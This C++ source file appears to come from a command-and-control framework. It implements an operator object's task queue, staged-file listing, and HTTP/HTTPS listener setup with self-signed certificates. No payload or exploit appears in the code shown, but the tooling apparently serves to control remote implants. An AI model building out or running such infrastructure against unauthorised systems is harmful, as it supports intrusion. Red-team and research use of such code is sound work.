//
// Created by diago on 2024-06-06.
//

#include <baphomet.hpp>
#include <components.hpp>


lurch::result<std::string>
lurch::baphomet::print_tasks() const {

    //
    // std::queue does not have iterators.
    // we need to create a copy and pop each element one by one.
    //

    std::queue copy_queue(tasks);
    std::string buff;

    while(!copy_queue.empty()) {
        buff += copy_queue.front() + '\n';
        copy_queue.pop();
    }

    if(buff.empty()) {
        return error("no tasks available.");
    }

    buff.pop_back();
    return { buff };
}


lurch::result<std::string>
lurch::baphomet::print_staged_files() const {

    if(const auto file_list = inst->db.fileman_get_file_list(id)) {
        std::string result;
        for(const auto& path : *file_list) {
            result += path.string() + '\n';
        }

        result.pop_back(); //remove trailing \n char
        return { result };
    }
    else {
        return file_list.error();
    }
}


lurch::result<std::string>
lurch::baphomet::clear_tasks() {
    if(tasks.empty()) {
        return error("no tasks exist");
    }

    while(!tasks.empty())
        tasks.pop();

    return { "cleared tasks." };
}


lurch::result<std::string>
lurch::baphomet::print_listeners() const {

    if(const auto listeners = inst->db.query_listeners_by_object(id)) {

        std::string buff;
        buff += io::format_str("{:<17} {:<7} {:<7}", "Address", "Port", "Proto") + '\n';
        buff += io::format_str("{:=<17} {:=<7} {:=<7}", "=", "=", "=") + '\n';

        for(const auto &[address, guid, port, type, cert, key] : *listeners) {
            buff += io::format_str(
                "{:<17} {:<7} {:<7}",
                address,
                port,
                io::listener_type_to_str(type)
            ) + '\n';
        }

        return { buff };
    }
    else {
        return error(listeners.error());
    }
}


lurch::result<std::string>
lurch::baphomet::start_listener(reciever_context &ctx) const {

    const auto [type, address, port] =
        ctx.cmd.get<std::string>("--type", "-t")
            .with<std::string>("--address", "-a")
            .with<int64_t>("--port", "-p")
            .done();


    if(*type == "http") {

        return inst->routing.start_listener_http(*address, *port, id, std::nullopt, std::nullopt)
            .and_then([&](bool _) {
                return inst->db.store_listener(*address, *port, id, std::nullopt, std::nullopt, listener_type::HTTP);
            })
            .and_then([&](bool _) {
                return result<std::string>(io::format_str("Successfully created HTTP listener on {}:{}", *address, *port));
            })
            .or_else([&](std::string err) {
                return result<std::string>(error(err));
            });
    }


    if(*type == "https") {

        auto cert_file = inst->db.fileman_get_by_extension(id, ".crt");
        auto key_file  = inst->db.fileman_get_by_extension(id, ".key");

        if(!cert_file || !key_file) {

            if(!std::filesystem::exists("static/fileman/" + id)) {
                std::filesystem::create_directory("static/fileman/" + id);
            }

            if(!inst->generate_self_signed_cert(
                io::format_str("static/fileman/{}/{}", id, "cert.crt"),
                io::format_str("static/fileman/{}/{}", id, "keyfile.key"),
                X509_VERSION_3
            )) {
                return error("Failed to generate self-signed certificate.");
            }

            cert_file = io::format_str("static/fileman/{}/{}", id, "cert.crt");
            key_file  = io::format_str("static/fileman/{}/{}", id, "keyfile.key");
        }


        return inst->routing.start_listener_http(*address, *port, id, cert_file->string(), key_file->string())
            .and_then([&](bool _) {
                return inst->db.store_listener(*address, *port, id, cert_file->string(), key_file->string(), listener_type::HTTPS);
            })
            .and_then([&](bool _) {
                return result<std::string>(io::format_str("Successfully created HTTPS listener on {}:{}", *address, *port));
            })
            .or_else([&](std::string err) {
                return result<std::string>(error(err));
            });
    }

    return error("Invalid listener type.");
}
